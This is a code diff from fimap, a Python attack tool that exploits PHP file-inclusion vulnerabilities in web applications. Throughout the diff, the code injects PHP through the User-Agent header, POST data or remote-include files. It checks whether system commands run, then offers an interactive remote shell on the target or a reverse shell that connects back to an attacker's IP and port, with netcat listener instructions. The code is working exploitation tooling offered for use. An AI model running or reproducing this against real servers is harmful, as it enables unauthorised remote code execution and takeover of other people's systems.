@@ -1,3 +1,4 @@
+import os
 #
 # This file is part of fimap.
 #
@@ -62,163 +63,170 @@ class codeinjector(baseClass):
         payload = "%s%s%s" %(prefix, shcode, suffix)
         path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
 
+        php_inject_works = False
+        sys_inject_works = False
+        working_shell    = None
+
         url  = "http://%s%s" %(hostname, path)
 
+        code = None
+
         if (mode.find("A") != -1 and mode.find("x") != -1):
-            self._log("Testing code injection thru User-Agent...", self.globSet.LOG_INFO)
-            self.globSet.setUserAgent(settings["php_info"][0])
-            code = self.doGetRequest(url)
-            if (code.find(settings["php_info"][1]) != -1):
-                self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
-                #self.filterResult(code, hostname)
-                for item in settings["php_exec"]:
-                    name, payload = item
-                    self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
-                    testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
-                    self.globSet.setUserAgent(testload)
-                    code = self.doGetRequest(url)
-                    if code.find(settings["shell_test"][1]) != -1:
-                        attack = self.chooseAttackMode()
-                        rndStart = self.getRandomStr()
-                        rndEnd = self.getRandomStr()
-                        if attack==1:
-                            cmd = ""
-                            print shell_banner
-                            while cmd != "q" and cmd != "quit":
-                                cmd = raw_input("fimap_shell$> ")
-                                if (cmd.strip() != ""):
-                                    userload = payload.replace("__PAYLOAD__", cmd)
-                                    userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
-                                    self.globSet.setUserAgent(userload)
-                                    code = self.doGetRequest(url)
-                                    code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                    print code.strip()
-
-                            print "See ya dude!"
-                            sys.exit(0)
-                        elif attack==2:
-                            ip   = raw_input("Enter your the IP where the shell should connect to: ")
-                            port = int(raw_input("Enter your the Port where the shell should connect to: "))
-                            print "netcat cmdline: nc -l -vv -p %d" %port
-                            raw_input("Open netcat on the target machine now and press enter...")
-                            print "Creating reverse shell now..."
-                            shellcode = settings["reverse_shell_code"]
-                            shellcode = shellcode.replace("__IP__", ip)
-                            shellcode = shellcode.replace("__PORT__", str(port))
-                            shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
-                            self.globSetUserAgent(shellcode)
-                            code = self.doGetRequest(url)
-                            code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                            print code.strip()
-                            sys.exit(0)
-
-        if (mode.find("P") != -1 and mode.find("x") != -1):
-            self._log("Testing code injection thru POST...", self.globSet.LOG_INFO)
-            code = self.doPostRequest(url, settings["php_info"][0])
-            if (code.find(settings["php_info"][1]) != -1):
-                self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
-                #self.filterResult(code, hostname)
-                for item in settings["php_exec"]:
-                    name, payload = item
-                    self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
-                    testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
-                    code = self.doPostRequest(url, testload)
-                    if (code != None):
-                        if code.find(settings["shell_test"][1]) != -1:
-                            attack = self.chooseAttackMode()
-                            rndStart = self.getRandomStr()
-                            rndEnd = self.getRandomStr()
-                            if attack==1:
-                                cmd = ""
-                                print shell_banner
-                                while cmd != "q" and cmd != "quit":
-                                    cmd = raw_input("fimap_shell$> ")
-                                    if (cmd.strip() != ""):
-                                        userload = payload.replace("__PAYLOAD__", cmd)
-                                        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
-                                        code = self.doPostRequest(url, userload)
-                                        code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                        print code.strip()
-                                print "See ya dude!"
-                                sys.exit(0)
-                            elif attack==2:
-                                ip   = raw_input("Enter your the IP where the shell should connect to: ")
-                                port = int(raw_input("Enter your the Port where the shell should connect to: "))
-                                print "netcat cmdline: nc -l -vv -p %d" %port
-                                raw_input("Open netcat on the target machine now and press enter...")
-                                print "Creating reverse shell now..."
-                                shellcode = settings["reverse_shell_code"]
-                                shellcode = shellcode.replace("__IP__", ip)
-                                shellcode = shellcode.replace("__PORT__", str(port))
-                                shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
-                                code = self.doPostRequest(url, shellcode)
-                                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                print code.strip()
-                                sys.exit(0)
-
-        if (mode.find("R") != -1 and mode.find("x") != -1):
-            if settings["dynamic_rfi"]["mode"] in ("ftp", "local"):
-                self._log("Testing code thru RFI...", self.globSet.LOG_INFO)
-                if self.executeRFI(url, appendix, settings["php_info"][0]).find(settings["php_info"][1]) != -1:
-                    for item in settings["php_exec"]:
-                        name, payload = item
-                        self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_ALWAYS)
-                        testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
-                        code = self.executeRFI(url, appendix, testload)
-                        if code.find(settings["shell_test"][1]) != -1:
-                            attack = self.chooseAttackMode()
-                            rndStart = self.getRandomStr()
-                            rndEnd = self.getRandomStr()
-                            if attack==1:
-                                cmd = ""
-                                print shell_banner
-                                while cmd != "q" and cmd != "quit":
-                                    cmd = raw_input("fimap_shell$> ")
-                                    if (cmd.strip() != ""):
-                                        userload = payload.replace("__PAYLOAD__", cmd)
-                                        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, userload, rndEnd)
-                                        code = self.executeRFI(url, appendix, userload)
-                                        code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                        print code.strip()
-                                print "See ya dude!"
-                                sys.exit(0)
-                            elif attack==2:
-                                ip   = raw_input("Enter your the IP where the shell should connect to: ")
-                                port = int(raw_input("Enter your the Port where the shell should connect to: "))
-                                print "netcat cmdline: nc -l -vv -p %d" %port
-                                raw_input("Open netcat on the target machine now and press enter...")
-                                print "Creating reverse shell now..."
-                                shellcode = settings["reverse_shell_code"]
-                                shellcode = shellcode.replace("__IP__", ip)
-                                shellcode = shellcode.replace("__PORT__", str(port))
-                                shellcode = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
-                                code = self.executeRFI(url, appendix, shellcode)
-                                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
-                                print code.strip()
-                                sys.exit(0)
-
+            self._log("Testing php-code injection thru User-Agent...", self.globSet.LOG_INFO)
+        elif (mode.find("P") != -1 and mode.find("x") != -1):
+            self._log("Testing php-code injection thru POST...", self.globSet.LOG_INFO)
+        elif (mode.find("R") != -1):
+            if settings["dynamic_rfi"]["mode"] == "ftp":
+                self._log("Testing code thru FTP->RFI...", self.globSet.LOG_INFO)
+                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+            elif settings["dynamic_rfi"]["mode"] == "local":
+                self._log("Testing code thru LocalHTTP->RFI...", self.globSet.LOG_INFO)
+                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
             else:
                 print "fimap is currently not configured to exploit RFI exploits."
                 sys.exit(1)
 
-
-        else:
-            print "Currently not supported."
-
-    def chooseAttackMode(self):
-        header = "Available Attacks"
-        textarr = []
-        textarr.append("[1] Spawn shell")
-        textarr.append("[2] Create reverse shell...")
-        self.drawBox(header, textarr)
-        try:
-            tech = raw_input("Choose Attack: ")
-            tech = int(tech)
-        except:
-            print "Invalid attack mode."
+        code = self.__doHaxRequest(url, mode, settings["php_info"][0], appendix)
+        if code == None:
+            self._log("php-code testing failed! code=None", self.globSet.LOG_ERROR)
             sys.exit(1)
 
-        return(tech)
+
+        if (code.find(settings["php_info"][1]) != -1):
+            self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
+            php_inject_works = True
+            for item in settings["php_exec"]:
+                name, payload = item
+                self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
+                testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
+                if (mode.find("A") != -1):
+                    self.globSet.setUserAgent(testload)
+                    code = self.doGetRequest(url)
+                elif (mode.find("P") != -1):
+                    code = self.doPostRequest(url, testload)
+                elif (mode.find("R") != -1):
+                    code = self.executeRFI(url, appendix, testload)
+
+                if code.find(settings["shell_test"][1]) != -1:
+                    sys_inject_works = True
+                    working_shell = item
+                    self._log("Execution thru '%s' works!"%(name), self.globSet.LOG_INFO)
+                    break
+
+            attack = None
+            while (attack != "q"):
+                attack = self.chooseAttackMode(php=php_inject_works, syst=sys_inject_works)
+                
+
+                if (type(attack) == str):
+                    if (attack == "fimap_shell"):
+                        cmd = ""
+                        print shell_banner
+                        while cmd != "q" and cmd != "quit":
+                            cmd = raw_input("fimap_shell$> ")
+                            if (cmd.strip() != ""):
+                                userload = payload.replace("__PAYLOAD__", cmd)
+                                code = self.__doHaxRequest(url, mode, userload, appendix)
+                                print code.strip()
+                        print "See ya dude!"
+                        sys.exit(0)
+                    else:
+                        print "Strange stuff..."
+                else:
+                    typ       = attack[0]
+                    attack    = attack[1]
+
+                    questions = attack[0]
+                    payload   = attack[1]
+
+                    if (questions != None):
+                        for q, p in questions:
+                            v = raw_input(q)
+                            payload = payload.replace(p, v)
+
+                    shellcode = None
+
+                    if (typ=="php"):
+                        shellcode = payload
+                    elif (typ=="sys"):
+                        shellcode = working_shell[1]
+                        shellcode = shellcode.replace("__PAYLOAD__", payload)
+
+
+                    userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
+
+                    if (mode.find("A") != -1):
+                        self.globSet.setUserAgent(userload)
+                        code = self.doGetRequest(url)
+                    elif (mode.find("P") != -1):
+                        code = self.doPostRequest(url, userload)
+                    elif (mode.find("R") != -1):
+                        code = self.executeRFI(url, appendix, userload)
+
+                    code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+                    print code.strip()
+        else:
+            print "Failed to test php injection. :("
+
+
+    def __doHaxRequest(self, url, m, payload, appendix=None):
+        code = None
+        rndStart = self.getRandomStr()
+        rndEnd = self.getRandomStr()
+
+        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, payload, rndEnd)
+        if (m.find("A") != -1):
+            self.globSet.setUserAgent(userload)
+            code = self.doGetRequest(url)
+        elif (m.find("P") != -1):
+            code = self.doPostRequest(url, userload)
+        elif (m.find("R") != -1):
+            code = self.executeRFI(url, appendix, userload)
+
+        if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+        return(code)
+
+    def chooseAttackMode(self, php=True, syst=True):
+        header = ""
+        choose = {}
+        textarr = []
+        idx = 1
+        
+        if (syst):
+            header = ":: Available Attacks - PHP and SHELL access ::"
+            textarr.append("[1] Spawn fimap shell")
+            choose[1] = "fimap_shell"
+            idx = 2
+            for k,v in settings["payloads"]["php"].items():
+                textarr.append("[%d] %s"%(idx,k))
+                choose[idx] = ("php", v)
+                idx = idx +1
+
+            for k,v in settings["payloads"]["sys"].items():
+                textarr.append("[%d] %s"%(idx,k))
+                choose[idx] = ("sys",v)
+                idx = idx +1
+
+        else:
+            header = ":: Available Attacks - PHP Only ::"
+            for k,v in settings["payloads"]["php"].items():
+                textarr.append("[%d] %s"%(idx,k))
+                choose[idx] = ("php", v)
+                idx = idx +1
+
+        textarr.append("[q] Quit")
+        self.drawBox(header, textarr)
+        while (1==1):
+            tech = raw_input("Choose Attack: ")
+            try:
+                if (tech.strip() == "q"):
+                    sys.exit(0)
+                tech = choose[int(tech)]
+                return(tech)
+
+            except Exception, err:
+                print "Invalid attack. Press 'q' to break."
+        
         
     def executeRFI(self, URL, appendix, content):
         if settings["dynamic_rfi"]["mode"]=="ftp":
@@ -228,6 +236,8 @@ class codeinjector(baseClass):
             return(code)
         elif settings["dynamic_rfi"]["mode"]=="local":
             fname = settings["dynamic_rfi"]["local"]["local_path"] + appendix
+            if (os.path.exists(fname)):
+                os.remove(fname)
             f = open(fname, "w")
             f.write(content)
             f.close()
@@ -235,52 +245,80 @@ class codeinjector(baseClass):
             return(code)
 
     
-    def chooseDomains(self):
+    def chooseDomains(self, OnlyExploitable=True):
         choose = {}
         nodes = self.getDomainNodes()
         idx = 1
-        header = "List of Domains"
+        header = ":: List of Domains ::"
         textarr = []
         for n in nodes:
             host = n.getAttribute("hostname")
-            choose[idx] = n
-            textarr.append("[%d] %s" %(idx, host))
-            idx = idx +1
+            showit = False
+            for child in self.getNodesOfDomain(host):
+                mode = child.getAttribute("mode")
+                if ("x" in mode):
+                    showit = True
+            if (showit or not OnlyExploitable):
+                choose[idx] = n
+                textarr.append("[%d] %s" %(idx, host))
+                idx = idx +1
+
+        textarr.append("[q] Quit")
         self.drawBox(header, textarr)
-        c = raw_input("Choose Domain: ")
-        try:
-            c = int(c)
-            return(choose[c])
-        except:
-            print "Invalid Domain ID."
-            sys.exit(1)
+        
+        while(1==1):
+            c = raw_input("Choose Domain: ")
+            if (c == "q"):
+                sys.exit(0)
+            try:
+                c = int(c)
+                ret = choose[c]
+                return(ret)
+            except:
+                print "Invalid Domain ID."
 
 
     def chooseVuln(self, hostname):
         choose = {}
         nodes = self.getNodesOfDomain(hostname)
-            
+        doRemoteWarn = False
+
         idx = 1
-        header = "FI Bugs on " + hostname
+        header = ":: FI Bugs on '" + hostname + "' ::"
         textarr = []
         for n in nodes:
             path = n.getAttribute("path")
             file = n.getAttribute("file")
             param = n.getAttribute("param")
             mode = n.getAttribute("mode")
-            if (mode.find("x") != -1):
+            if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
+                doRemoteWarn = True
+
+            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                 choose[idx] = n
                 textarr.append("[%d] URL: '%s' injecting file: '%s' using param: '%s'" %(idx, path, file, param))
                 idx = idx +1
+
         if (idx == 1):
+            if (doRemoteWarn):
+                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
             print "This domain has no usable bugs."
             sys.exit(1)
 
+        
+        textarr.append("[q] Quit")
         self.drawBox(header, textarr)
-        c = raw_input("Choose vulnerable script: ")
-        try:
-            c = int(c)
-            return(choose[c])
-        except:
-            print "Invalid script ID."
-            sys.exit(1)
+
+        if (doRemoteWarn):
+            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"
+
+        while (1==1):
+            c = raw_input("Choose vulnerable script: ")
+            if (c == "q"):
+                sys.exit(0)
+            try:
+                c = int(c)
+                ret = choose[c]
+                return(ret)
+            except:
+                print "Invalid script ID."
